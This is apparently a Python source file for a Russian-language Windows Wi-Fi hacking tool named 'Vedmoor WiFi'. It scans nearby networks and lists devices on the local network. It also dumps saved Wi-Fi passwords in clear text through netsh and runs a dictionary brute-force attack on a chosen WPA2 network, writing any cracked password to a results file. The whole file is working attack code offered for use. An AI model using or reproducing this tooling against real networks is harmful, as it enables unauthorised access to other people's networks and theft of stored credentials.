import os
import subprocess
import time

from pystyle import Center, Colorate, Colors
from pywifi import Profile, PyWiFi, const

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"

banner = """

╭───────────────────────────────────────────────────────────────────────────────────────────╮
│                                                                                           │
│    ▄█    █▄     ▄████████ ████████▄        ▄█     █▄   ▄█     ▄████████  ▄█               │
│   ███    ███   ███    ███ ███   ▀███      ███     ███ ███    ███    ███ ███               │
│   ███    ███   ███    █▀  ███    ███      ███     ███ ███▌   ███    █▀  ███▌              │
│   ███    ███  ▄███▄▄▄     ███    ███      ███     ███ ███▌  ▄███▄▄▄     ███▌              │
│   ███    ███ ▀▀███▀▀▀     ███    ███      ███     ███ ███▌ ▀▀███▀▀▀     ███▌              │
│   ███    ███   ███    █▄  ███    ███      ███     ███ ███    ███        ███               │
│   ███    ███   ███    ███ ███   ▄███      ███ ▄█▄ ███ ███    ███        ███               │
│    ▀██████▀    ██████████ ████████▀        ▀███▀███▀  █▀     ███        █▀                │
│                                                                                           │
│                                                                                           │
│            [●] For Windows only  | Если не работает, запустите от имени администратора    │
│            [●] Coder: @vedmoor                                                            │
│            [●] Для возврата напишите 99                                                   │
│                                                                                           │
│                                                                                           │
│                        [1] Доступные сети                                                 │
│                        [2] Сохраненные пароли                                             │
│                        [3] Устройства в вашей сети                                        │
│                        [4] Подбор пароля к вайфай                                         │
│                                                                                           │
╰───────────────────────────────────────────────────────────────────────────────────────────╯                            
                                       
"""


def get_networks():
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(2)
    results = iface.scan_results()
    for network in results:
        print(f"SSID: {network.ssid}, Сигнал: {network.signal}")
        time.sleep(0.3)


def get_devices():
    try:
        devices = subprocess.check_output("arp -a", shell=True).decode("cp1251")
    except UnicodeDecodeError:
        devices = subprocess.check_output("arp -a", shell=True).decode("latin1")
    print("Устройства в локальной сети:")
    print(devices)


def bruteforce_network(ssid, passwords_path):
    print(f"{GREEN}Результат взлома будет сохранён в Vedmoor_Wifi_Result.txt!{RESET}")
    with open(passwords_path, "r") as file:
        passwords = file.readlines()
    passwords = [password.strip() for password in passwords]
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(5)
    results = iface.scan_results()

    for network in results:
        if network.ssid == ssid:
            for password in passwords:
                profile = Profile()
                profile.ssid = ssid
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm.append(const.AKM_TYPE_WPA2PSK)
                profile.cipher = const.CIPHER_TYPE_CCMP
                profile.key = password
                iface.add_network_profile(profile)
                iface.connect(iface.add_network_profile(profile))
                time.sleep(0.7)
                if iface.status() == const.IFACE_CONNECTED:
                    print(
                        f"{GREEN}Подключение к {ssid} с паролем {password} успешно!{RESET}"
                    )
                    try:
                        with open("Vedmoor_Wifi_Result.txt", "w") as file:
                            file.write(password)
                        print(
                            f"{GREEN}Пароль от {ssid} успешно сохранён в Vedmoor_Wifi_Result.txt!{RESET}"
                        )
                    except Exception as e:
                        print(
                            f"{RED}Ошибка при записи в Vedmoor_Wifi_Result.txt: {e}{RESET}"
                        )
                    return
                else:
                    print(
                        f"{RED}Не удалось подключиться к {ssid} с паролем {password}{RESET}"
                    )
    print(f"{RED}Не удалось подключиться к {ssid}!{RESET}")
    with open("Vedmoor_Wifi_Result.txt", "w") as file:
        file.write(
            f"{RED}Не получилось взломать сеть! Ни один из паролей не подошел.{RESET}"
        )


def get_passwords():
    data = (
        subprocess.check_output(["netsh", "wlan", "show", "profiles"])
        .decode("cp866")
        .split("\n")
    )
    WiFis = [
        line.split(":")[1][1:-1] for line in data if "Все профили пользователей" in line
    ]
    for WiFi in WiFis:
        results = (
            subprocess.check_output(
                ["netsh", "wlan", "show", "profile", WiFi, "key=clear"]
            )
            .decode("cp866")
            .split("\n")
        )
        results = [
            line.split(":")[1][1:-1] for line in results if "Содержимое ключа" in line
        ]
        try:
            print(f"{GREEN}Имя сети: {WiFi}, Пароль: {results[0]}{RESET}")
        except IndexError:
            print(f"{RED}Сеть: {WiFi}, пароль не найден!{RESET}")


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


if __name__ == "__main__":
    while True:
        clear_screen()
        print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner)))
        choice = input("Выберите номер: ")
        if choice == "1":
            get_networks()
        elif choice == "2":
            get_passwords()
        elif choice == "3":
            get_devices()
        elif choice == "4":
            ssid = input("Имя сети: ")
            file_path = "Vedmoor_Wordlist.txt"
            print(
                "Для подбора используется словарь Vedmoor_Wordlist.txt ( >500к паролей)"
            )
            bruteforce_network(ssid, file_path)
        elif choice == "99":
            os.system("python main.py")
            break
        else:
            print(f"{RED}Неверный выбор!{RESET}")
        input("Нажмите ENTER для выхода в меню ")
